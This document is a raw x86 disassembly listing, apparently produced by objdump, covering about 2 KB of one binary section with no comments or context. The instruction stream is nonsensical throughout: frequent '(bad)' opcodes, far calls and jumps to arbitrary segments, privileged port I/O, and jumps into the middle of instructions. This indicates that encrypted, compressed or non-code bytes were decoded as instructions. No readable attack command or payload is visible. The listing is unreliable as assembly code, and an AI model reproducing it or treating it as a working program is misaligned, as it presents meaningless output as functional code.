  40bdc5:	test   BYTE PTR [edx-0x3bfd1026],0x58
  40bdcc:	call   0xfbff:0xcccf2179
  40bdd3:	mov    dh,cl
  40bdd5:	and    DWORD PTR [edx+0x5a],ebx
  40bdd8:	dec    esp
  40bdd9:	fdivr  QWORD PTR [bp+si-0x58]
  40bddd:	ins    DWORD PTR es:[edi],dx
  40bdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddf:	aas    
  40bde0:	cmc    
  40bde1:	sub    esp,DWORD PTR [edi]
  40bde3:	jae    0x40bdde
  40bde5:	ret    0xd1fa
  40bde8:	fs sahf 
  40bdea:	repnz in eax,dx
  40bdec:	inc    ecx
  40bded:	dec    DWORD PTR [edx+0x7e60cb7c]
  40bdf3:	loopne 0x40bde2
  40bdf5:	inc    eax
  40bdf6:	int    0x96
  40bdf8:	sub    al,0x11
  40bdfa:	adc    DWORD PTR [edi],edx
  40bdfc:	jb     0x40bdf1
  40bdfe:	and    al,0xf0
  40be00:	adc    bh,BYTE PTR [eax]
  40be02:	outs   dx,BYTE PTR ds:[esi]
  40be03:	add    DWORD PTR [ecx],eax
  40be05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be06:	inc    edx
  40be07:	cmp    esi,DWORD PTR [edx-0x7a]
  40be0a:	push   ecx
  40be0b:	sub    esp,eax
  40be0d:	aaa    
  40be0e:	(bad)  [ebx]
  40be10:	xchg   BYTE PTR [ebx+0x7d80aa8f],bl
  40be16:	leave  
  40be17:	push   edx
  40be18:	test   al,0x69
  40be1a:	add    al,0x31
  40be1c:	into   
  40be1d:	add    eax,0x2e18b705
  40be22:	retf   
  40be23:	jbe    0x40bdda
  40be25:	cwde   
  40be26:	popf   
  40be27:	test   BYTE PTR [esi+0x8],ch
  40be2a:	jge    0x40bdf5
  40be2c:	enter  0xd5ce,0x4
  40be30:	mov    al,0x15
  40be32:	mov    ebx,0xdc887401
  40be37:	xor    al,0x1
  40be39:	aaa    
  40be3a:	call   FWORD PTR [edi+0x78]
  40be3d:	cmp    al,0x19
  40be3f:	hlt    
  40be40:	es mov esi,0x9bb85570
  40be46:	xchg   esi,eax
  40be47:	ret    0x448c
  40be4a:	(bad)  
  40be4b:	aaa    
  40be4c:	sub    esi,ecx
  40be4e:	rol    ch,1
  40be50:	ret    
  40be51:	and    edx,esp
  40be53:	cmp    ah,dh
  40be55:	ficom  DWORD PTR [ebx+ebp*2]
  40be58:	jmp    0x1b40:0xfe271209
  40be5f:	aaa    
  40be60:	sbb    dh,BYTE PTR [eax+ebx*8]
  40be63:	inc    esi
  40be64:	xchg   esi,eax
  40be65:	shl    BYTE PTR [ecx-0x6bf2cf3c],1
  40be6b:	add    BYTE PTR [edi+0x718ef606],ah
  40be71:	jmp    0xc092886e
  40be76:	jl     0x40be17
  40be78:	or     BYTE PTR ds:0xb054e62d,bh
  40be7e:	push   ebp
  40be7f:	mov    ds:0xe6b44f50,eax
  40be84:	rol    eax,1
  40be86:	jae    0x40be49
  40be88:	inc    ebx
  40be89:	loopne 0x40be2f
  40be8b:	test   eax,0xc4938473
  40be90:	retf   0x99a6
  40be93:	out    0x54,eax
  40be95:	aas    
  40be96:	aas    
  40be97:	dec    edx
  40be98:	cdq    
  40be99:	and    eax,0x8ef626b2
  40be9e:	arpl   WORD PTR [ebp-0x1f],bx
  40bea1:	lods   eax,DWORD PTR ds:[esi]
  40bea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea3:	xlat   BYTE PTR ds:[ebx]
  40bea4:	add    al,0x85
  40bea6:	inc    ebx
  40bea7:	call   0x278:0xd5d1a1e9
  40beae:	ficom  DWORD PTR [eax]
  40beb0:	cmp    DWORD PTR [edx-0x5b],edi
  40beb3:	mov    ch,0x85
  40beb5:	add    BYTE PTR [edx],bl
  40beb7:	cli    
  40beb8:	sbb    eax,0x62e03c69
  40bebd:	not    ah
  40bebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bec0:	mov    al,0xd3
  40bec2:	je     0x40beca
  40bec4:	loopne 0x40bf02
  40bec6:	out    dx,al
  40bec7:	mov    dh,0x7b
  40bec9:	xchg   edx,eax
  40beca:	jb     0x40bf30
  40becc:	lahf   
  40becd:	dec    ebx
  40bece:	(bad)  
  40bed0:	push   edi
  40bed1:	cwde   
  40bed2:	pop    edi
  40bed3:	call   0x47ea:0x9d919cc7
  40beda:	mov    esi,0x59052611
  40bedf:	in     al,0x96
  40bee1:	fs lahf 
  40bee3:	and    BYTE PTR [edx],0xaf
  40bee6:	cdq    
  40bee7:	and    bl,BYTE PTR [ecx+0xe]
  40beea:	ins    BYTE PTR es:[edi],dx
  40beeb:	popf   
  40beec:	jg     0x40be95
  40beee:	cli    
  40beef:	or     DWORD PTR [esi-0x26],ebp
  40bef2:	sub    DWORD PTR [ecx],0xa3342a2f
  40bef8:	ret    0xe678
  40befb:	xor    esp,DWORD PTR [edx]
  40befd:	into   
  40befe:	sub    DWORD PTR [eax],0x4a
  40bf01:	(bad)  
  40bf02:	js     0x40bebf
  40bf04:	leave  
  40bf05:	sub    al,0x61
  40bf07:	int3   
  40bf08:	fwait
  40bf09:	add    BYTE PTR [ebx],0x36
  40bf0c:	iret   
  40bf0d:	ret    0x2545
  40bf10:	mov    edx,0x775bee2c
  40bf15:	das    
  40bf16:	addr16 enter 0xff05,0x6e
  40bf1b:	mov    dl,0xef
  40bf1d:	mov    ebp,0x988d0993
  40bf22:	les    ecx,FWORD PTR ds:0xc8b92b1
  40bf28:	mov    edx,0x44b09d4e
  40bf2d:	xor    DWORD PTR [edx+0x46],0x55fe160d
  40bf34:	xchg   edx,eax
  40bf35:	into   
  40bf36:	xor    esi,DWORD PTR [eiz*4+0x47c285ee]
  40bf3d:	sahf   
  40bf3e:	adc    edx,DWORD PTR [eax+0x1ebd092a]
  40bf44:	dec    ebp
  40bf45:	and    eax,0x291d050c
  40bf4a:	shl    ah,cl
  40bf4c:	ja     0x40bfaa
  40bf4e:	sbb    eax,0xf77b48a
  40bf53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf54:	push   ss
  40bf55:	mov    edi,0xd5099e0a
  40bf5a:	add    DWORD PTR [ecx],esp
  40bf5c:	in     eax,dx
  40bf5d:	(bad)  
  40bf5f:	mov    edi,0x24daf190
  40bf64:	in     eax,0x90
  40bf66:	adc    esi,DWORD PTR [ecx-0x12]
  40bf69:	dec    edi
  40bf6a:	add    esi,esp
  40bf6c:	clc    
  40bf6d:	push   es
  40bf6e:	inc    edx
  40bf6f:	(bad)  
  40bf70:	(bad)  
  40bf71:	pop    ebx
  40bf72:	fcomi  st,st(1)
  40bf74:	xchg   ecx,eax
  40bf75:	hlt    
  40bf76:	mov    ecx,0x5b8794b5
  40bf7b:	jae    0x40bf50
  40bf7d:	xchg   ebx,eax
  40bf7e:	int3   
  40bf7f:	in     al,0x1f
  40bf81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf82:	mov    esi,0x660343c0
  40bf87:	or     BYTE PTR [edx-0x7f],bh
  40bf8a:	mov    eax,0x4e650427
  40bf8f:	out    0x38,al
  40bf91:	inc    edx
  40bf92:	sti    
  40bf93:	aam    0x6f
  40bf95:	lahf   
  40bf96:	adc    al,0xc8
  40bf98:	sbb    BYTE PTR [ecx+0x37],cl
  40bf9b:	cmc    
  40bf9c:	sbb    eax,DWORD PTR [esi+0x2c]
  40bf9f:	outs   dx,DWORD PTR ds:[esi]
  40bfa0:	inc    eax
  40bfa1:	ds call 0xe0598498
  40bfa7:	xchg   edi,eax
  40bfa8:	test   DWORD PTR ds:0x3b5964d5,esp
  40bfae:	stc    
  40bfaf:	mov    dl,0xff
  40bfb1:	stc    
  40bfb2:	mov    al,0xc2
  40bfb4:	mov    eax,0xfbe4ba12
  40bfb9:	les    ebp,FWORD PTR [eax-0x35]
  40bfbc:	push   esp
  40bfbd:	andnps xmm7,XMMWORD PTR [edi]
  40bfc0:	mov    esp,0x3e971c90
  40bfc5:	pop    esi
  40bfc6:	mov    ebx,0x70f9d0a7
  40bfcb:	pop    edx
  40bfcc:	ss mov edi,0x2835597
  40bfd2:	push   ebx
  40bfd3:	add    dl,BYTE PTR [ecx+0x6]
  40bfd6:	mov    esp,0x2f633321
  40bfdb:	cld    
  40bfdc:	push   ecx
  40bfdd:	sbb    al,0x1b
  40bfdf:	aam    0xa5
  40bfe1:	fs cmp ch,0x37
  40bfe5:	pop    ss
  40bfe6:	cmp    BYTE PTR [ebx-0x1d],0x0
  40bfea:	pop    esp
  40bfeb:	aad    0x27
  40bfed:	sub    bl,BYTE PTR [esi+0x2]
  40bff0:	jmp    0x2908:0x5fb4d0d5
  40bff7:	xor    eax,0x4af61c13
  40bffc:	cli    
  40bffd:	push   edi
  40bffe:	mov    cl,0x3f
  40c000:	xchg   edi,eax
  40c001:	mov    dh,0x90
  40c003:	sub    dl,BYTE PTR [esi+0x339ad6b8]
  40c009:	(bad)  
  40c00a:	(bad)  
  40c00b:	arpl   WORD PTR [ebx-0x7c4e0241],si
  40c011:	sub    BYTE PTR [ebp-0x30cf6809],al
  40c017:	ret    
  40c018:	ja     0x40c042
  40c01a:	js     0x40c019
  40c01c:	sbb    esi,DWORD PTR [esi]
  40c01e:	mov    dh,0xe8
  40c020:	sbb    eax,0x475edf04
  40c025:	push   edx
  40c026:	test   eax,ebx
  40c028:	in     eax,dx
  40c029:	fcomp  st(2)
  40c02b:	xchg   edi,eax
  40c02c:	retf   
  40c02d:	(bad)
  40c031:	push   es
  40c032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c033:	push   edx
  40c034:	lahf   
  40c035:	fs aas 
  40c037:	or     DWORD PTR [ebp+0x1833296],edx
  40c03d:	icebp  
  40c03e:	push   ss
  40c03f:	cmp    edx,DWORD PTR [ebx-0x2e7e037e]
  40c045:	test   eax,0x74c1b536
  40c04a:	stos   BYTE PTR es:[edi],al
  40c04b:	in     eax,dx
  40c04c:	xor    eax,0x626b800a
  40c051:	out    0x22,eax
  40c053:	push   esi
  40c054:	scas   al,BYTE PTR es:[edi]
  40c055:	sbb    bh,BYTE PTR [edx]
  40c057:	fs jl  0x40c057
  40c05a:	sbb    eax,0xa51a4912
  40c05f:	sbb    dl,BYTE PTR [edi-0x6e5a01d3]
  40c065:	dec    edi
  40c066:	xor    DWORD PTR [eax],0x5f18d780
  40c06c:	das    
  40c06d:	daa    
  40c06e:	mov    BYTE PTR [esi+0x7e68623f],ah
  40c074:	std    
  40c075:	pop    ecx
  40c076:	push   eax
  40c077:	std    
  40c078:	fucom  st(3)
  40c07a:	arpl   WORD PTR [ebx-0x6339c09f],cx
  40c080:	ins    BYTE PTR es:[edi],dx
  40c081:	cs or  eax,0xf0dd8d1b
  40c087:	mov    edi,0x7cf5c5c0
  40c08c:	loope  0x40c0b2
  40c08e:	push   ds
  40c08f:	in     eax,0x58
  40c091:	enter  0x5a45,0x87
  40c095:	mov    al,ds:0x89e35862
  40c09a:	cmp    BYTE PTR [ebx],ah
  40c09c:	xor    edx,DWORD PTR [ecx-0x7e]
  40c09f:	jne    0x40c09b
  40c0a1:	pop    ecx
  40c0a2:	jge    0x40c123
  40c0a4:	or     al,0x95
  40c0a6:	xor    BYTE PTR [edi-0x2a],0x8b
  40c0aa:	pop    DWORD PTR [eax+0x72]
  40c0ad:	mov    dl,0x6e
  40c0af:	or     ebp,DWORD PTR [esi+edx*8]
  40c0b2:	out    dx,al
  40c0b3:	lahf   
  40c0b4:	lock in al,0xd1
  40c0b7:	jo     0x40c092
  40c0b9:	or     al,0xb
  40c0bb:	sub    DWORD PTR [esi],edi
  40c0bd:	mov    ah,bh
  40c0bf:	(bad)  
  40c0c0:	cdq    
  40c0c1:	sbb    al,0x4f
  40c0c3:	mov    edi,0x2c6c6346
  40c0c8:	mov    ebx,0xbe4c3473
  40c0cd:	mov    al,ds:0x80007e6e
  40c0d2:	stos   BYTE PTR es:[edi],al
  40c0d3:	xchg   DWORD PTR ds:0x2c038216,ecx
  40c0d9:	retf   0xc0b6
  40c0dc:	mov    DWORD PTR [edx],esi
  40c0de:	xchg   ebp,eax
  40c0df:	or     bh,cl
  40c0e1:	test   al,0x63
  40c0e3:	mov    ecx,0xf01cbe6e
  40c0e8:	pusha  
  40c0e9:	or     BYTE PTR [esi+0x1bd47d6d],0xba
  40c0f0:	mov    bl,0x86
  40c0f2:	jne    0x40c154
  40c0f4:	sub    DWORD PTR [esi+eiz*1-0x40849aa6],esi
  40c0fb:	mov    ah,BYTE PTR ss:[esi+0x20441aa9]
  40c102:	adc    eax,DWORD PTR [esi]
  40c104:	pushf  
  40c105:	jmp    0xd977:0xdd6e4a35
  40c10c:	sbb    BYTE PTR [esi+ecx*4-0x37df4899],ah
  40c113:	add    DWORD PTR [edx+0x187f98ae],edx
  40c119:	aas    
  40c11a:	xor    esp,DWORD PTR [ebx+esi*8-0x11fdce92]
  40c121:	push   esp
  40c122:	fdiv   DWORD PTR [ebp+0x7d0a7a89]
  40c128:	clc    
  40c129:	mov    dl,0x6b
  40c12b:	cmp    eax,0x13a3d6d8
  40c130:	jp     0x40c1a5
  40c132:	jnp    0x40c13e
  40c134:	scas   eax,DWORD PTR es:[edi]
  40c135:	dec    edi
  40c136:	pop    ebp
  40c137:	mov    DWORD PTR [esi],ebp
  40c139:	ss mov edx,0x29f4d8f9
  40c13f:	add    DWORD PTR ds:0x61a4d9ea,edi
  40c146:	mov    ds:0xd132a584,al
  40c14b:	push   esp
  40c14c:	and    DWORD PTR [edi-0x20],eax
  40c14f:	jecxz  0x40c0ed
  40c151:	sahf   
  40c152:	or     eax,0xaa5831ca
  40c157:	or     esp,ebp
  40c159:	mov    BYTE PTR [edi+eax*4+0x63],cl
  40c15d:	mov    bl,0xa3
  40c15f:	xor    DWORD PTR [ecx],ebx
  40c161:	dec    DWORD PTR [ebx+0x63]
  40c164:	mov    bh,cl
  40c166:	xor    ebx,DWORD PTR [eax+0xd]
  40c169:	sbb    BYTE PTR [ebx+edi*8],dh
  40c16c:	in     al,dx
  40c16d:	or     ebp,DWORD PTR [ebp+0x69]
  40c170:	add    esp,DWORD PTR [esi+0x6d766684]
  40c176:	and    BYTE PTR [eax+eax*2+0x6c],dh
  40c17a:	mov    esp,DWORD PTR [ebx-0x7531288a]
  40c180:	iret   
  40c181:	mov    DWORD PTR [esi],0xe3b211f2
  40c187:	imul   ebx,esi,0xfffffffb
  40c18a:	mov    al,ds:0xed8bfa5f
  40c18f:	in     eax,dx
  40c190:	dec    esi
  40c191:	mov    ecx,0x8e1d0f4d
  40c196:	test   BYTE PTR [eax+edi*8+0x50f00e15],ah
  40c19d:	xchg   esp,eax
  40c19e:	or     al,0x3f
  40c1a0:	xor    BYTE PTR [edx+0x4c],dl
  40c1a3:	call   0xb1ec53ef
  40c1a8:	inc    edi
  40c1a9:	lds    esi,FWORD PTR [edx-0x4f7029]
  40c1af:	jmp    0x40c1af
  40c1b1:	popa   
  40c1b2:	ret    
  40c1b3:	mov    cl,0x20
  40c1b5:	(bad)  
  40c1b6:	cmp    al,BYTE PTR [edi-0x7ac2e27e]
  40c1bc:	stos   DWORD PTR es:[edi],eax
  40c1bd:	(bad)  
  40c1be:	out    dx,al
  40c1bf:	pusha  
  40c1c0:	mov    al,ds:0xa50a4b80
  40c1c5:	(bad)  
  40c1c6:	push   edi
  40c1c7:	mov    ds:0x8519d293,eax
  40c1cc:	push   edx
  40c1cd:	cmc    
  40c1ce:	pop    ecx
  40c1cf:	or     eax,0x8e799f9b
  40c1d4:	std    
  40c1d5:	sub    edi,DWORD PTR [edi+0x13]
  40c1d8:	dec    edi
  40c1d9:	mov    bl,0x2a
  40c1db:	out    0x65,al
  40c1dd:	bound  edx,QWORD PTR [eax]
  40c1df:	fsubp  st(4),st
  40c1e1:	cdq    
  40c1e2:	push   ss
  40c1e3:	push   ebp
  40c1e4:	pop    esi
  40c1e5:	mov    WORD PTR [ebx+eax*8],es
  40c1e8:	das    
  40c1e9:	inc    ebp
  40c1ea:	shl    esi,cl
  40c1ec:	sahf   
  40c1ed:	pop    ebx
  40c1ee:	bound  eax,QWORD PTR [esi+ecx*8-0x15]
  40c1f2:	stos   DWORD PTR es:[edi],eax
  40c1f3:	xchg   edx,eax
  40c1f4:	imul   edi,DWORD PTR [ecx+ecx*2+0xa],0x4
  40c1f9:	daa    
  40c1fa:	and    eax,0x172fbb9a
  40c1ff:	in     eax,0x6c
  40c201:	pushf  
  40c202:	xor    esi,edi
  40c204:	jg     0x40c263
  40c206:	inc    eax
  40c207:	sbb    ah,BYTE PTR [edi-0x7b]
  40c20a:	and    bl,0xd8
  40c20d:	arpl   cx,cx
  40c20f:	cmp    BYTE PTR ds:0x5c2125a4,dh
  40c215:	fistp  DWORD PTR [ecx+0x63]
  40c218:	adc    BYTE PTR [ecx],bh
  40c21a:	je     0x40c202
  40c21c:	out    dx,eax
  40c21d:	jg     0x40c1d5
  40c21f:	in     al,0x5e
  40c221:	outs   dx,BYTE PTR ds:[esi]
  40c222:	push   edi
  40c223:	sahf   
  40c224:	xor    al,0xce
  40c226:	jbe    0x40c221
  40c228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c229:	in     al,0xb
  40c22b:	jbe    0x40c2a2
  40c22d:	xchg   al,dh
  40c22f:	aam    0x0
  40c231:	dec    ebp
  40c232:	outs   dx,DWORD PTR ds:[esi]
  40c233:	fs jae 0x40c232
  40c236:	je     0x40c2ad
  40c238:	nop
  40c239:	cmp    ah,BYTE PTR [ecx]
  40c23b:	sub    dh,BYTE PTR [edx-0x63]
  40c23e:	adc    al,0x28
  40c240:	dec    ebx
  40c241:	pushf  
  40c242:	pop    ds
  40c243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c244:	in     eax,dx
  40c245:	mov    ch,0x14
  40c247:	loopne 0x40c2ab
  40c249:	sbb    al,0xed
  40c24b:	stos   DWORD PTR es:[edi],eax
  40c24c:	icebp  
  40c24d:	lahf   
  40c24e:	clc    
  40c24f:	pop    esp
  40c250:	mov    ebx,ecx
  40c252:	pushf  
  40c253:	shl    ecx,0xe9
  40c256:	les    edi,FWORD PTR [ebp+0x6fe10c6]
  40c25c:	sbb    dh,BYTE PTR [ebx-0x67]
  40c25f:	xor    eax,DWORD PTR [edx+0x14eb29eb]
  40c265:	xor    dl,cl
  40c267:	mov    ch,0xf3
  40c269:	and    eax,0x4c89ecc1
  40c26e:	mov    esi,0x88afdebe
  40c273:	cmp    al,0xf7
  40c275:	jmp    0x3a6d9e40
  40c27a:	out    0xa5,al
  40c27c:	es and DWORD PTR ss:[ebx],edi
  40c280:	xor    ch,bl
  40c282:	mov    cl,BYTE PTR [ebp+0xdea4e8]
  40c288:	int    0x2a
  40c28a:	enter  0x3973,0x78
  40c28e:	adc    al,0x1e
  40c290:	adc    bh,BYTE PTR [edi-0x30]
  40c293:	std    
  40c294:	aas    
  40c295:	test   BYTE PTR [edi-0x2c],dl
  40c298:	neg    DWORD PTR [ebp-0x57bf12c7]
  40c29e:	push   ss
  40c29f:	loop   0x40c2b8
  40c2a1:	dec    esi
  40c2a2:	nop
  40c2a3:	pop    ebx
  40c2a4:	and    edx,edx
  40c2a6:	sbb    ebx,esi
  40c2a8:	(bad)  
  40c2a9:	pop    eax
  40c2aa:	fbstp  TBYTE PTR [esi-0x42]
  40c2ad:	jbe    0x40c31b
  40c2af:	sub    esi,ecx
  40c2b1:	inc    ecx
  40c2b2:	pop    ecx
  40c2b3:	rcl    BYTE PTR [esi+0x5d4a214a],1
  40c2b9:	add    edx,DWORD PTR [ecx+0x2b]
  40c2bc:	push   edi
  40c2bd:	stc    
  40c2be:	and    al,0x69
  40c2c0:	cmp    ch,ah
  40c2c2:	mov    bl,0x48
  40c2c4:	mov    esi,0xe0d4b8db
  40c2c9:	pusha  
  40c2ca:	hlt    
  40c2cb:	jmp    0x40c2aa
  40c2cd:	inc    edi
  40c2ce:	sbb    al,0x62
  40c2d0:	sbb    al,BYTE PTR [ebp+0x68f8bfbe]
  40c2d6:	adc    eax,0x6e0dcc21
  40c2db:	xchg   edi,eax
  40c2dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2dd:	lock mov ch,0x94
  40c2e0:	mov    eax,0xcd287b5b
  40c2e5:	mov    dh,BYTE PTR [esp+ebx*2]
  40c2e8:	adc    DWORD PTR [esi],0x43c08bb0
  40c2ee:	addr16 enter 0x9d1c,0x9b
  40c2f3:	lods   eax,DWORD PTR ds:[esi]
  40c2f4:	shl    BYTE PTR [esi+0x1cab6c69],0x67
  40c2fb:	pop    ds
  40c2fc:	clc    
  40c2fd:	pop    ss
  40c2fe:	inc    eax
  40c2ff:	sub    eax,0xfa197b80
  40c304:	aas    
  40c305:	sti    
  40c306:	sbb    ch,BYTE PTR [ecx-0x36]
  40c309:	dec    ebp
  40c30a:	enter  0x424e,0xc0
  40c30e:	(bad)  
  40c30f:	mov    esi,0xbcd72ab1
  40c314:	sti    
  40c315:	push   0x6e
  40c317:	sbb    BYTE PTR [edx-0x59],ah
  40c31a:	dec    ebp
  40c31b:	jle    0x40c302
  40c31d:	jo     0x40c2da
  40c31f:	retf   
  40c320:	cmp    edi,esp
  40c322:	outs   dx,BYTE PTR ds:[esi]
  40c323:	dec    ebp
  40c324:	push   cs
  40c325:	mov    ds,WORD PTR [edx]
  40c327:	and    ch,bh
  40c329:	dec    ebp
  40c32a:	lods   eax,DWORD PTR ds:[esi]
  40c32b:	xchg   ah,ah
  40c32d:	xchg   ebp,eax
  40c32e:	jle    0x40c35e
  40c330:	mov    eax,0x1315642
  40c335:	test   al,0xd8
  40c337:	push   esi
  40c338:	pop    ebp
  40c339:	or     BYTE PTR [ebx-0x2e],cl
  40c33c:	hlt    
  40c33d:	push   ss
  40c33e:	mov    esp,fs
  40c340:	out    0x1a,al
  40c342:	xchg   esi,eax
  40c343:	mov    al,ds:0x98311a2
  40c348:	mov    esp,0x4ee65aca
  40c34d:	imul   eax,DWORD PTR [ebx+eiz*4],0xffffffe8
  40c351:	fmulp  st(0),st
  40c353:	jle    0x40c386
  40c355:	jb     0x40c33d
  40c357:	and    al,0x66
  40c359:	int    0xce
  40c35b:	fldcw  WORD PTR [edi+eax*4-0x72c33b4d]
  40c362:	cmp    BYTE PTR [eax+eiz*4-0x39],bh
  40c366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c367:	pop    esp
  40c368:	les    ecx,FWORD PTR [edi-0x66598b39]
  40c36e:	fnsave [esi-0x12]
  40c371:	push   ecx
  40c372:	mov    ah,ch
  40c374:	pop    ds
  40c375:	add    DWORD PTR [esi+0x2519a86d],ebx
  40c37b:	xchg   ebp,eax
  40c37c:	adc    BYTE PTR ds:0x1468649c,dl
  40c382:	lea    ebp,[eax+eiz*4]
  40c385:	arpl   sp,si
  40c387:	icebp  
  40c388:	cld    
  40c389:	adc    DWORD PTR [ecx+0xf6d4c1f],esp
  40c38f:	mov    ah,0x6c
  40c391:	push   ds
  40c392:	data16 aad 0xb
  40c395:	add    edi,eax
  40c397:	scas   eax,DWORD PTR es:[edi]
  40c398:	inc    edi
  40c399:	mov    edx,0xc7a09707
  40c39e:	sbb    eax,0x63b84f4a
  40c3a3:	fcom   QWORD PTR [ebp+0x517452f7]
  40c3a9:	sahf   
  40c3aa:	sub    ebx,DWORD PTR [ebp-0x148e5910]
  40c3b0:	enter  0xfa7e,0x93
  40c3b4:	jbe    0x40c37a
  40c3b6:	mov    gs,WORD PTR [eax]
  40c3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3b9:	data16 shl BYTE PTR ds:0xc847b08f,cl
  40c3c0:	mov    dl,0xd5
  40c3c2:	add    ebp,DWORD PTR [edi+0x67e846dc]
  40c3c8:	call   0xf7012f31
  40c3cd:	inc    ebp
  40c3ce:	adc    al,0x35
  40c3d0:	mov    esi,ss
  40c3d2:	loop   0x40c361
  40c3d4:	mov    ah,0x4d
  40c3d6:	jmp    0x40c3cf
  40c3d8:	sbb    BYTE PTR [edi-0xf],dh
  40c3db:	or     BYTE PTR [edi],dl
  40c3dd:	add    ebx,esi
  40c3df:	xor    ch,dl
  40c3e1:	dec    edi
  40c3e2:	mov    WORD PTR [edx],es
  40c3e4:	repz mov dh,0x19
  40c3e7:	jp     0x40c41b
  40c3e9:	dec    ecx
  40c3ea:	dec    ebp
  40c3eb:	aas    
  40c3ec:	int    0x8e
  40c3ee:	mov    al,0xee
  40c3f0:	pop    edx
  40c3f1:	sub    eax,0x37e0b21c
  40c3f6:	and    al,0x4c
  40c3f8:	stc    
  40c3f9:	sti    
  40c3fa:	xor    al,0x79
  40c3fc:	xchg   ebp,eax
  40c3fd:	sti    
  40c3fe:	imul   esp,esp,0x6b23ef23
  40c404:	push   0xffffffa5
  40c406:	or     al,BYTE PTR [ebx-0x12625369]
  40c40c:	nop
  40c40d:	inc    ebx
  40c40e:	cmp    cl,dl
  40c410:	les    edx,FWORD PTR [eax+0x273a8c69]
  40c416:	mov    al,ds:0xd6881a98
  40c41b:	(bad)  
  40c41d:	pop    ebx
  40c41e:	es rol al,cl
  40c421:	xlat   BYTE PTR ds:[ebx]
  40c422:	psadbw mm6,QWORD PTR [ebx]
  40c425:	call   0x5054:0x7b68a355
  40c42c:	pop    esp
  40c42d:	xchg   BYTE PTR [esi],al
  40c42f:	fcmovnb st,st(4)
  40c431:	outs   dx,BYTE PTR ds:[esi]
  40c432:	xor    edi,DWORD PTR [eax+eiz*1-0x469daa27]
  40c439:	jno    0x40c3f8
  40c43b:	jle    0x40c414
  40c43d:	repnz add ch,0xf2
  40c441:	jmp    0xc8b7:0x5c6be469
  40c448:	icebp  
  40c449:	add    al,al
  40c44b:	jg     0x40c492
  40c44d:	inc    esi
  40c44e:	sbb    bh,dh
  40c450:	jae    0x40c478
  40c452:	sbb    al,0xe9
  40c454:	push   0x49763a7a
  40c459:	fimul  WORD PTR [edi+0x5d]
  40c45c:	add    DWORD PTR [ebx+eax*8],esp
  40c45f:	or     BYTE PTR [edx+0x1006e1c],al
  40c465:	jge    0x40c48a
  40c467:	sbb    edi,edi
  40c469:	mov    bh,0xbd
  40c46b:	loop   0x40c48c
  40c46d:	add    edi,DWORD PTR [ebp+eiz*2+0xbea155d]
  40c474:	pop    ebp
  40c475:	and    dl,BYTE PTR [eax-0x10]
  40c478:	mov    BYTE PTR [esi],ch
  40c47a:	(bad)  
  40c47b:	ja     0x40c478
  40c47d:	jg     0x40c422
  40c47f:	sbb    eax,0xf0334ec8
  40c484:	sti    
  40c485:	cmp    BYTE PTR [ecx],bh
  40c487:	dec    edx
  40c488:	sub    al,0x89
  40c48a:	test   eax,0x46b015f0
  40c48f:	clts   
  40c491:	push   0xfffffffc
  40c493:	adc    eax,0x5a8a828a
  40c498:	xchg   ebp,eax
  40c499:	pop    esi
  40c49a:	int    0xe0
  40c49c:	or     edi,DWORD PTR ds:0xc7fda305
  40c4a2:	mov    ds:0x66511147,al
  40c4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4a8:	mov    eax,0xb6a2ed00
  40c4ad:	iret   
  40c4ae:	push   esi
  40c4af:	pop    ebx
  40c4b0:	cmp    al,dl
  40c4b2:	stos   DWORD PTR es:[edi],eax
  40c4b3:	inc    edx
  40c4b4:	mov    ah,BYTE PTR [edx-0x3f4315a0]
  40c4ba:	lods   eax,DWORD PTR ds:[esi]
  40c4bb:	test   BYTE PTR [eax-0x63],0xb8
  40c4bf:	push   es
  40c4c0:	popf   
  40c4c1:	dec    BYTE PTR [eax+esi*1-0x4d]
  40c4c5:	mov    ax,0xe5af
  40c4c9:	les    eax,FWORD PTR [edx-0x2f0c0a48]
  40c4cf:	ins    BYTE PTR es:[edi],dx
  40c4d0:	jge    0x40c4f7
  40c4d2:	pop    es
  40c4d3:	into   
  40c4d4:	sbb    esp,DWORD PTR [ebx+0x16cdfeab]
  40c4da:	(bad)  
  40c4db:	outs   dx,BYTE PTR ds:[esi]
  40c4dc:	adc    BYTE PTR [edi],ch
  40c4de:	mov    dh,bl
  40c4e0:	mov    ecx,0xc5c90e9a
  40c4e5:	mov    cl,0x8c
  40c4e7:	mov    cs,WORD PTR [edi]
  40c4e9:	push   ebp
  40c4ea:	dec    ecx
  40c4eb:	fs daa 
  40c4ed:	ins    BYTE PTR es:[edi],dx
  40c4ee:	and    ebp,ebx
  40c4f0:	fmul   QWORD PTR fs:[esi-0x34df589f]
  40c4f7:	(bad)  [ecx-0x80]
  40c4fa:	pop    ebx
  40c4fb:	inc    esi
  40c4fc:	pusha  
  40c4fd:	stc    
  40c4fe:	(bad)  
  40c4ff:	add    DWORD PTR [ecx+0x576f122b],ecx
  40c505:	call   0xe5a86c74
  40c50a:	out    dx,eax
  40c50b:	js     0x40c56d
  40c50d:	out    dx,al
  40c50e:	mov    al,0xfe
  40c510:	call   0x4ed5a03a
  40c515:	inc    BYTE PTR [edx-0x5a80695d]
  40c51b:	and    BYTE PTR [esi-0x1debff0e],bl
  40c521:	jecxz  0x40c57e
  40c523:	dec    eax
  40c524:	scas   al,BYTE PTR es:[edi]
  40c525:	push   es
  40c526:	mov    eax,0xa10f37be
  40c52b:	shl    esi,cl
  40c52d:	jmp    0xcea0:0x7ab85c8c
  40c534:	ficomp DWORD PTR [ebx-0x4a59c1ce]
  40c53a:	pop    esi
  40c53b:	retf   0x1c4
  40c53e:	sar    BYTE PTR [ebx-0x11bd7446],1
  40c544:	std    
  40c545:	xchg   edx,eax
  40c546:	(bad)
  40c549:	ret    0xb7a1
  40c54c:	cmp    DWORD PTR ds:0xd3b57833,edx
  40c552:	(bad)  
  40c553:	push   ss
